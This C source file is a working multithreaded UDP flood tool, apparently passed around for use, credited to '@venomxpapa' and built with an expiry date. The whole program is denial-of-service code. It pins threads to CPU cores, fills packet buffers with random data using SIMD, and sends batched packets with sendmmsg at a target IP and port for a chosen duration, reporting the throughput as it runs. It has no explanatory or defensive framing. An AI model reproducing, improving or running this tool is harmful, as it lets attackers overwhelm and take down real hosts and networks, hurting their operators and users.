#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sched.h>
#include <errno.h>
#include <immintrin.h>
#include <stdatomic.h>
#include <sys/time.h>
#include <signal.h>

#define MAX_THREADS 1000

typedef struct {
    char ip[16];
    int port;
    int duration;
    int thread_id;
    int cpu_core;
    int packet_size;
    int batch_size;
} __attribute__((aligned(64))) attack_params;

atomic_ulong total_packets_sent = 0;
volatile sig_atomic_t running = 1;

void handle_signal(int sig) {
    (void)sig;
    running = 0;
}

void check_expiry() {
    struct tm expiry_tm = {0};
    expiry_tm.tm_year = 2025 - 1900;
    expiry_tm.tm_mon = 4;
    expiry_tm.tm_mday = 29;
    time_t now = time(NULL);
    if (now > mktime(&expiry_tm)) {
        fprintf(stderr, "This binary has expired baap se mang @venomxpapa.\n");
        exit(1);
    }
}

void bind_to_core(int core_id) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core_id, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
}

void fill_buffer_simd(char *buffer, size_t size) {
    size_t i = 0;
    for (; i + 32 <= size; i += 32) {
        __m256i rand_vals;
        unsigned long long r[4];
        for (int j = 0; j < 4; j++) {
            if (!_rdrand64_step(&r[j])) r[j] = ((unsigned long long)rand() << 32) | rand();
        }
        rand_vals = _mm256_set_epi64x(r[0], r[1], r[2], r[3]);
        _mm256_storeu_si256((__m256i *)(buffer + i), rand_vals);
    }
    for (; i < size; i++) {
        buffer[i] = rand() % 256;
    }
}

void *attack_thread(void *arg) {
    attack_params *params = (attack_params *)arg;
    bind_to_core(params->cpu_core);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        pthread_exit(NULL);
    }

    int sndbuf = 10 * 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    struct sockaddr_in target_addr = {
        .sin_family = AF_INET,
        .sin_port = htons(params->port)
    };
    inet_pton(AF_INET, params->ip, &target_addr.sin_addr);

    size_t buffer_size = params->packet_size * params->batch_size;
    char *buffers = aligned_alloc(32, buffer_size);
    if (!buffers) {
        perror("aligned_alloc");
        close(sock);
        pthread_exit(NULL);
    }

    struct mmsghdr *msgs = calloc(params->batch_size, sizeof(struct mmsghdr));
    struct iovec *iovecs = calloc(params->batch_size, sizeof(struct iovec));

    for (int i = 0; i < params->batch_size; i++) {
        fill_buffer_simd(buffers + i * params->packet_size, params->packet_size);
        iovecs[i].iov_base = buffers + i * params->packet_size;
        iovecs[i].iov_len = params->packet_size;
        msgs[i].msg_hdr.msg_name = &target_addr;
        msgs[i].msg_hdr.msg_namelen = sizeof(target_addr);
        msgs[i].msg_hdr.msg_iov = &iovecs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
    }

    time_t end_time = time(NULL) + params->duration;
    while (time(NULL) < end_time && running) {
        ssize_t sent = sendmmsg(sock, msgs, params->batch_size, 0);
        if (sent > 0) {
            atomic_fetch_add(&total_packets_sent, sent);
        }
    }

    free(buffers);
    free(msgs);
    free(iovecs);
    close(sock);
    return NULL;
}

void *stats_thread(void *arg) {
    int packet_size = *(int *)arg;
    unsigned long last_count = 0;
    while (running) {
        sleep(1);
        unsigned long current = atomic_load(&total_packets_sent);
        unsigned long delta = current - last_count;
        last_count = current;
        double gbps = ((double)delta * 8 * packet_size) / 1e9;
        printf("[STATS] PPS: %lu | Gbps: %.2f | Total Packets: %lu\n", delta, gbps, current);
        fflush(stdout);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    signal(SIGINT, handle_signal);
    check_expiry();

    if (argc != 7) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <DURATION> <THREADS> <PACKET_SIZE> <landsize> made by @venomxpapa\n", argv[0]);
        return 1;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);
    int packet_size = atoi(argv[5]);
    int batch_size = atoi(argv[6]);

    if (threads > MAX_THREADS) threads = MAX_THREADS;

    pthread_t tid[threads];
    attack_params params[threads];

    for (int i = 0; i < threads; i++) {
        strncpy(params[i].ip, ip, 15);
        params[i].ip[15] = '\0';
        params[i].port = port;
        params[i].duration = duration;
        params[i].thread_id = i;
        params[i].cpu_core = i % sysconf(_SC_NPROCESSORS_ONLN);
        params[i].packet_size = packet_size;
        params[i].batch_size = batch_size;

        pthread_create(&tid[i], NULL, attack_thread, &params[i]);
    }

    pthread_t stat_thread;
    pthread_create(&stat_thread, NULL, stats_thread, &packet_size);

    for (int i = 0; i < threads; i++) {
        pthread_join(tid[i], NULL);
    }

    running = 0;
    pthread_join(stat_thread, NULL);

    return 0;
}
